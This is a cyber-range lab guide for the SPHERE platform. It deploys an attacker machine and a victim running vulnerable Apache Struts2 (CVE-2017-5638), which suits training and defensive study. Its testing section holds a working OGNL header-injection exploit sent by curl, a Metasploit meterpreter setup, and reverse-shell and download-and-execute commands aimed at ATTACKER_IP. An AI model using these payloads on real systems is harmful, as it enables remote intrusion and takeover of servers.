# Deploy a vulnerable Struts2 server
In this example, we demonstrate how to deploy a cyber attack range on the SPHERE platform that includes one attacker machine and one target machine.

## Detailed Deploying Steps

### Deploy the Cyber Range Environment

1. In the “Model Editor” interface of the SPHERE platform, deploy the following model.
    ```python
    from mergexp import *

    # Create a network topology object
    net = Network('Single-Victim', addressing==ipv4, routing==static)

    attacker = net.node('attacker', image=='kali', proc.cores>=8, memory.capacity>=gb(32))
    victim = net.node('victim', image=='2404', proc.cores==2, memory.capacity==gb(2))

    # Create a link connecting the three nodes
    link = net.connect([attacker,victim])

    # Make this file a runnable experiment
    experiment(net)
    ```

2. Create a Reservation based on that model.

3. Activate the Reservation.

4. In your Experiment Development Containers (XDCs), attach to the activation. If you used machines of Ubuntu 24.04, by default, the 32 GB disk allocated to a virtual machine is not automatically expanded/mounted to the root (/) filesystem, which can make the system unusable. On such machines, the following commands usually need to be executed manually:
    ```
    sudo partprobe
    sudo resize2fs /dev/vda3
    ```

    You can also run this [script](../initial_setup/resize-root-disk.md) on the XDC server to solve this issue.


### Deploy the Target Victim Machine
We use Ansible to automatically configure the vulnerable target machine. In this attack scenario, our target is a vulnerable Apache Struts2 application.

0. Before running the commands below, you need to [install Ansible](../setup_ansible/readme.md) first.

1. Check the victim machine’s hostname and username (in most cases, the password is not required, so you may choose whether to include it). Then update the corresponding configuration in the [`struts2_lab/inventory.ini`](inventory.ini) file accordingly.
    ``` ini
    [struts2_vm]
    struts2-target ansible_host=IP_ADDRESS ansible_user=USER_NAME ansible_become_pass=PASSWORD

    [struts2_vm:vars]
    ansible_python_interpreter=/usr/bin/python3
    ```

2. Execute the following command
    ```bash
    ansible-playbook -i inventory.ini struts2_target.yml --ask-become-pass
    ```

    (Note: You may not need to type the password when deploying this on SPHERE since it does not require it. Simply just hit the "Enter" key.)
 
After the above commands are completed, you will see output information, including instructions on how to perform basic functional testing.

### Deploy the Attack Machine
Please refer to this [doc](../attacker_setup/readme.md) to setup the attack machine.


## Detailed Information about the Target System

Service: Apache Struts2 Showcase Application

Vulnerability: CVE-2017-5638 (S2-045)

Struts2 Version: 2.3.12 (vulnerable)

Port: 8080

URL: http://{{ target_ip }}:8080/struts2-showcase/

Service: systemctl status tomcat

### Exploitation Details

Vulnerability Type: Remote Code Execution via Content-Type header
Attack Vector: OGNL Expression Injection

Vulnerable Endpoints: ANY endpoint accepting multipart/form-data

## Testing (from attacker machine)
You need to replace the target_ip to the real IP address to run the following tests.

### Basic command execution test

```
curl -i -X POST http://{{ target_ip }}:8080/struts2-showcase/integration/saveGangster.action \
-H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

### Metasploit Usage

```
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS {{ target_ip }}
set RPORT 8080
set TARGETURI /struts2-showcase/integration/saveGangster.action
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
exploit
```

### Additional Testing

#### Simple command execution tests
Replace '#cmd='id'' with:
- '#cmd='whoami''
- '#cmd='pwd''
- '#cmd='cat /etc/passwd''
- '#cmd='ls -la /tmp''
- '#cmd='uname -a''

#### Reverse shell example (update ATTACKER_IP/PORT)
'#cmd='bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1''

#### Download and execute
'#cmd='wget http://ATTACKER_IP/payload.sh -O /tmp/p.sh && bash /tmp/p.sh''

### CREDENTIALS

SSH User: webuser

Password: password123

Root access: sudo su (if webuser is in sudoers)